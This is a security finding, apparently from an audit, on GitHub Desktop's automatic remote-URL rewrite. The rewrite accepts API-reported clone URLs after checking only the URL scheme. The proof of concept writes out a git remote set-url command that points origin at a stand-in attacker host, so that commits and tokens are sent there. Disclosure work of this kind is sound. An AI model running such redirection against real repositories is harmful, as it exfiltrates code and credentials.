### Title
Silent, unprompted rewrite of the tracked repository's git remote URL from an attacker-influenced GitHub API repository object - (File: `app/src/lib/stores/updates/update-remote-url.ts`)

### Summary
`updateRemoteUrl()` automatically calls `gitStore.setRemoteURL()` to overwrite the local `origin` remote whenever a background refresh of a repository's GitHub metadata returns a `clone_url` that no longer matches the local remote. The only safety checks are a same-*scheme* check (`https` vs `ssh`, not host/owner/repo) and a check that the remote hadn't been manually customized. No event, notification, or user confirmation is ever emitted when the remote is silently rewritten, so a repo whose GitHub-side metadata is attacker-influenced can have its push/fetch target silently redirected.

### Finding Description
`repositoryWithRefreshedGitHubRepository()` runs during routine, non-interactive repository refresh (e.g. periodic background refresh, sign-in/account change) and fetches the repository's metadata from the GitHub API: [1](#0-0) 

It then unconditionally passes that API object to `updateRemoteUrl`: [2](#0-1) 

The only guard preventing an arbitrary rewrite is `protocolsMatch`, which merely compares the URL *scheme* (`https:` vs `ssh:`/`git:`), never the hostname, owner, or repository name: [3](#0-2) 

If `protocolsMatch && remoteUrlUnchanged && !urlsMatch`, the code calls `gitStore.setRemoteURL(...)`, which invokes `git remote set-url` directly against the working repository with no user prompt and no emitted event — only an internal `emitUpdate()` used for UI state refresh, not a security-relevant audit trail: [4](#0-3) [5](#0-4) 

Because `urlMatchesRemote` compares hostname/owner/name (not the raw string), `!urlsMatch` is `true` whenever the API-reported `clone_url` points to a *different host, owner, or repo name* than the current remote — exactly the case an attacker wants. As long as the scheme is unchanged (e.g., still `https://`), the rewrite proceeds silently.

This is the direct analog of the seed report's "missing event" class: a state-changing, security-relevant operation (`setRemoteURL`) executes with no emitted signal that would let a user notice or audit the change. Here the analog is stronger because the trigger for that state change is untrusted external data (a GitHub/GHE API repository object), not a locally-initiated admin action.

### Impact Explanation
If an attacker can influence the `IAPIRepository`/`IAPIFullRepository` object returned for a tracked repository (e.g. a compromised or malicious GitHub Enterprise Server endpoint the user has added an account for, a MITM'd/rogue proxy in front of the API, or a repojacking scenario where a repository is deleted/renamed and the same owner/name is later reclaimed by an attacker), Desktop will silently repoint the user's `origin` remote to the attacker's clone URL. Subsequent user-initiated `git push`/`git fetch` operations then transparently target the attacker's server: the user's code is exfiltrated to the attacker on push, and future pulls/fetches can inject attacker-controlled commits into what the user believes is their trusted repository. Because git credential helpers key off the remote host, an attacker-controlled hostname can also cause credential material for that endpoint to be sent to the attacker during the ensuing push. This matches "silent corruption of what the user commits or pushes" and potential credential exposure, with no event or dialog alerting the user that their remote just changed.

### Likelihood Explanation
This code path runs automatically as part of normal, passive repository refresh (background account/API sync) — no unusual user action is required beyond having Desktop open with the repository added and the account signed in. The only precondition is that `remoteUrlUnchanged` holds (the user hasn't manually customized the remote away from what Desktop stored previously), which is the common case for most users who clone/track from GitHub Desktop. The protocol-only check gives a false sense of safety while doing nothing to validate host/owner/repo identity.

### Recommendation
- Do not silently rewrite `origin` (or any remote) based on API-reported `clone_url` changes; instead, surface a user-facing confirmation dialog (similar to the existing `UpstreamAlreadyExists` dialog pattern) before calling `setRemoteURL`.
- At minimum, emit a trackable event/notification (e.g., a `RemoteURLChanged` app event, analogous to the recommended `NewFlashLender` event in the seed report) whenever `setRemoteURL` is invoked from an automated code path, so the change is auditable and visible to the user.
- Strengthen the `protocolsMatch` guard to also require that the *hostname* is unchanged (or restrict automatic updates to same-host owner/name-only changes, e.g. repository renames within the same host), rejecting cross-host rewrites entirely without explicit user consent.

### Proof of Concept
1. User adds a GitHub Enterprise (or GitHub.com) account and has a repository tracked whose `origin` remote matches the GitHub repository's stored `cloneURL` (the common, default case).
2. Attacker gains control of the API response for that repository's endpoint (e.g., compromises/spoofs the GHE server, sits on a MITM proxy, or reclaims a deleted repository's owner/name) and returns an `IAPIFullRepository` object with `clone_url` set to `https://attacker.example.com/evil/repo.git` (same `https` scheme as the original).
3. On the next background refresh, `app-store.ts`'s `repositoryWithRefreshedGitHubRepository` fetches this object and calls `updateRemoteUrl` → `gitStore.setRemoteURL`, silently executing `git remote set-url origin https://attacker.example.com/evil/repo.git` with no prompt or notification.
4. The next time the user pushes from Desktop, their commits and, depending on credential-helper behavior, their auth token are sent to the attacker's host instead of the legitimate repository.

export async function setRemoteURL(
  repository: Repository,
  name: string,
  url: string
): Promise<true> {
  await git(['remote', 'set-url', name, url], repository.path, 'setRemoteURL')
  return true
}
